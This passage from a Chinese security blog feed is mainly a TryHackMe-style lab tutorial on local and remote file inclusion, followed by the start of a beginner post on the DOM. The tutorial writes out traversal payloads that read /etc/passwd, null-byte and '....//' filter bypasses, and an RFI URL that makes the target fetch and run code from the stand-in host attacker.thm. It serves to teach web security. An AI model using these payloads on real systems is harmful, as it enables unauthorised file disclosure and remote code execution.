&lt;p&gt;同样，有效负载看起来类似于路径遍历，但 include 函数允许我们将任何调用的文件包含到当前页面中。以下是漏洞利用：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://webapp.thm/index.php?lang=../../../../etc/passwd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;本地文件包含-lfi2&#34;&gt;本地文件包含 LFI2
&lt;/h2&gt;&lt;p&gt;在这项任务中，我们将更深入地了解 LFI。我们讨论了在 include 函数中绕过过滤器的几种技术。&lt;/p&gt;
&lt;p&gt;在前两种情况下，我们检查了 Web 应用程序的代码，然后我们知道如何利用它。但是，在本例中，我们正在执行黑盒测试，其中我们没有源代码。在这种情况下，错误对于了解数据如何传递和处理到 Web 应用程序中非常重要。&lt;/p&gt;
&lt;p&gt;在此方案中，我们有以下入口点： &lt;code&gt;http://webapp.thm/index.php?lang=EN&lt;/code&gt; 。如果我们输入无效的输入（例如 THM），则会收到以下错误&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Warning&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;languages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;THM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;failed&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stream&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;such&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;directory&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;www&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;THM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;错误消息泄露了重要信息。输入 THM 作为输入后，将显示一条错误消息，显示 include 函数的外观：&lt;code&gt;include（languages/THM.php）;&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;如果你仔细查看该目录，我们可以看出 functions includes files in the languages 目录正在添加 .php 的 API 文件。因此，有效的输入将如下所示：&lt;code&gt;index.php？lang=EN&lt;/code&gt;，其中文件 EN 位于给定的语言目录中，名为 EN。php 的&lt;/p&gt;
&lt;p&gt;此外，错误消息还泄露了有关完整 Web 应用程序目录路径的另一条重要信息，即 &lt;code&gt;/var/www/html/THM-4/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;要利用这一点，我们需要使用 &lt;code&gt;../&lt;/code&gt; 技巧，如 目录遍历 部分所述，以导出当前文件夹。让我们尝试以下作：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://webapp.thm/index.php?lang=../../../../etc/passwd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;请注意，我们使用了 4 ../ 因为我们知道该路径有四个级别 &lt;code&gt;/var/www/html/THM-4&lt;/code&gt;。但我们仍然收到以下错误：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Warning&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;languages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/../../../../../&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;etc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;failed&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stream&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;such&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;directory&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;www&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;THM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;似乎我们可以移出 PHP 目录，但是 include 函数仍然使用 .PHP 最后！这告诉我们开发人员指定要传递给 include 函数的文件类型。要绕过这种情况，我们可以使用 NULL BYTE，即 &lt;code&gt;%00&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;使用空字节是一种注入技术，其中 URL 编码的表示形式（如 %00 或 0x00）以十六进制表示形式与用户提供的数据一起终止字符串。您可以将其视为试图欺骗 Web 应用程序忽略 Null Byte 之后的任何内容。&lt;/p&gt;
&lt;p&gt;通过在有效负载的末尾添加 Null Byte，我们告诉 include 函数忽略 null 字节之后的任何内容，这可能如下所示：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;include(&amp;#34;languages/../../../../../etc/passwd%00&amp;#34;).&amp;#34;.php&amp;#34;); `等同于 `include(&amp;#34;languages/../../../../../etc/passwd&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt; %00 技巧是固定的，不适用于 PHP 5.3.4 及更高版本。&lt;/p&gt;
&lt;h3 id=&#34;四&#34;&gt;四
&lt;/h3&gt;&lt;p&gt;现在在实验 #4 中应用这个技术，并弄清楚如何读取 /etc/passwd。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/index.php?lang=../../../../etc/passwd&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://webapp.thm/index.php?lang=../../../../etc/passwd&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我们收到了以下错误！&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;Warning&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;languages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;etc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;failed&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;stream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;such&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;directory&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;www&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;THM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;如果我们检查 include（languages/etc/passwd） 部分中的警告消息，我们知道 Web 应用程序替换了 ../ 替换为空字符串。我们可以使用几种技术来绕过这种情况。&lt;/p&gt;
&lt;p&gt;首先，我们可以发送以下 payload 来绕过它： &lt;code&gt;....//....//....//....//....//etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这之所以有效，是因为 PHP 过滤器仅匹配并替换第一个子集字符串 &lt;code&gt;../&lt;/code&gt; 它找到并且不执行另一次传递，留下下图所示的内容。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319152704750.png&#34;
	width=&#34;480&#34;
	height=&#34;179&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319152704750_hu_ef9e9f89552662f6.png 480w, https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319152704750_hu_c24a9352b4e8f91.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;268&#34;
		data-flex-basis=&#34;643px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;五&#34;&gt;五
&lt;/h3&gt;&lt;p&gt;最后，我们将讨论开发人员强制 include 从定义的目录中读取的情况！例如，如果 Web 应用程序要求提供必须包含目录的输入，例如： &lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/index.php?lang=languages/EN.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://webapp.thm/index的php?lang=languages/EN.php&lt;/a&gt;然后，要利用这一点，我们需要将目录包含在有效负载中，如下所示： &lt;code&gt;?lang=languages/../../../../../etc/passwd&lt;/code&gt; 。&lt;/p&gt;
&lt;h2 id=&#34;远程文件包含-rfi&#34;&gt;远程文件包含 RFI
&lt;/h2&gt;&lt;p&gt;远程文件包含 （RFI） 是一种将远程文件包含到易受攻击的应用程序中的技术。与 LFI 一样，RFI 发生在对用户输入进行不当审查时，从而允许攻击者将外部 URL 注入 include 函数。RFI 的一个要求是需要打开 allow_url_fopen 选项。&lt;/p&gt;
&lt;p&gt;RFI 的风险高于 LFI，因为 RFI 漏洞允许攻击者在服务器上获得远程命令执行 （RCE）。RFI 攻击成功的其他后果包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;敏感信息泄露&lt;/li&gt;
&lt;li&gt;跨站点脚本 （XSS）&lt;/li&gt;
&lt;li&gt;拒绝服务 （DoS）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;外部服务器必须与应用程序服务器通信，才能成功进行 RFI 攻击，攻击者在其服务器上托管恶意文件。然后，恶意文件通过 HTTP 请求注入 include 函数，恶意文件的内容在易受攻击的应用程序服务器上执行。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319152859979.png&#34;
	width=&#34;1113&#34;
	height=&#34;693&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319152859979_hu_6f1e20d3e6e530c9.png 480w, https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319152859979_hu_280e9dd5d6272836.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;160&#34;
		data-flex-basis=&#34;385px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;rfi步骤&#34;&gt;RFI步骤
&lt;/h3&gt;&lt;p&gt;下图是成功进行 RFI 攻击的步骤示例！假设攻击者在他们自己的服务器 http：//attacker 上托管了一个 PHP 文件。thm/cmd.txt，其中 cmd.txt 包含打印消息 Hello THM.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?PHP echo &amp;#34;Hello THM&amp;#34;; ?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;首先，攻击者注入恶意 URL，该 URL 指向攻击者的服务器，例如 &lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt&lt;/a&gt;的攻击者。THM/cmd.txt。如果没有输入验证，则恶意 URL 将传递到 include 函数中。接下来，Web 应用程序服务器将向恶意服务器发送 GET 请求以获取文件。因此，Web 应用程序将远程文件包含在 include 函数中，以执行页面内的 PHP 文件并将执行内容发送给攻击者。在我们的示例中，当前页面在某处必须显示 Hello THM 消息。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>DOM 文档对象模型</title>
        <link>https://Yerucrem.github.io/p/dom-%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/</link>
        <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/dom-%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/</guid>
        <description>&lt;img src="https://Yerucrem.github.io/p/dom-%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/73aeab67fb4786d5331bab4f3b2452827dba9d186069cdc60db0ecfab89b34c5.png" alt="Featured image of post DOM 文档对象模型" /&gt;&lt;h1 id=&#34;dom&#34;&gt;DOM
&lt;/h1&gt;&lt;p&gt;Document Object Model 文档对象模型&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.w3.org/TR/REC-DOM-Level-1/introduction.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;什么是文档对象模型？ &amp;mdash; What is the Document Object Model?&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;dom-是什么&#34;&gt;DOM 是什么？
&lt;/h2&gt;&lt;p&gt;想象一下，你有一张房子的&lt;strong&gt;建筑蓝图&lt;/strong&gt;，上面画着房子的每一个部分：墙、门、窗户、屋顶等等。DOM 就像是网页的“蓝图”。当你打开一个网页，浏览器会把网页的 HTML 代码（那些 &lt;code&gt;&amp;lt;html&amp;gt;、&amp;lt;div&amp;gt;、&amp;lt;p&amp;gt;&lt;/code&gt; 标签）解析成一个树状结构，这个结构就是 DOM。它把网页里的每一个元素（比如标题、段落、图片）都整理得清清楚楚，让计算机（特别是 JavaScript）能找到它们、操作它们。&lt;/p&gt;
&lt;p&gt;简单来说，DOM 是网页的&lt;strong&gt;骨架图&lt;/strong&gt;，它把网页的内容变成一个个“节点”（node），这些节点就像蓝图上的标记点，互相之间还有父子关系、兄弟关系，形成一个大树。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;html&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;head&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;title&amp;gt;我的网页&amp;lt;/title&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;body&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;h1&amp;gt;欢迎&amp;lt;/h1&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;p&amp;gt;这是一个段落。&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;/body&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/html&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;在这个 HTML 里，DOM 会把它变成一个树形结构：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- &amp;lt;html&amp;gt; 是根节点，就像树的树根，整个网页的起点。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- &amp;lt;html&amp;gt; 下面有两个“孩子”：&amp;lt;head&amp;gt; 和 &amp;lt;body&amp;gt;。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- &amp;lt;head&amp;gt; 里有个孩子 &amp;lt;title&amp;gt;，它的内容是“我的网页”。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- &amp;lt;body&amp;gt; 里有两个孩子：&amp;lt;h1&amp;gt;（内容是“欢迎”）和 &amp;lt;p&amp;gt;（内容是“这是一个段落。”）。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
